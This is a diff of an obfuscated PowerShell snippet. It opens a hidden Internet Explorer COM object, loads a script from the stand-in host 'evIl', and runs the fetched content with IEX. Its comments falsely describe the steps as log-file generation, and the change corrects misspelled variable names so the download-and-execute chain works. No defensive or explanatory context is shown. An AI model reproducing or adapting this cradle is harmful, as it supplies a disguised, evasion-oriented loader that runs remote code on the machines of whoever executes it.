@@ -21,14 +21,14 @@ After:
 # generating Log files
 $Strawberry = New-Object -CoMObjEcT inTErnETeXPLOreR.Application;
 $strawberry.vISiblE = $fAlSe;
-$STRaWbeRRy.NAVigatE('HttP://evIl/eViL.ps1');
+$STRaWbeRRy.NAVigatE('HttP://evIl/evil.ps1');
 stArT-SlEEp -s 5;
 
 # Updating log directory path
-$r = $StrawwberrY.DoCument.BoDy.InneRHTML;
+$r = $StrawberrY.DoCument.BoDy.InneRHTML;
 
 # Cleanup
-$sthrawBerRyu.quiT();
+$strawBerRy.quiT();
 
 # Execute payload
 IeX $R
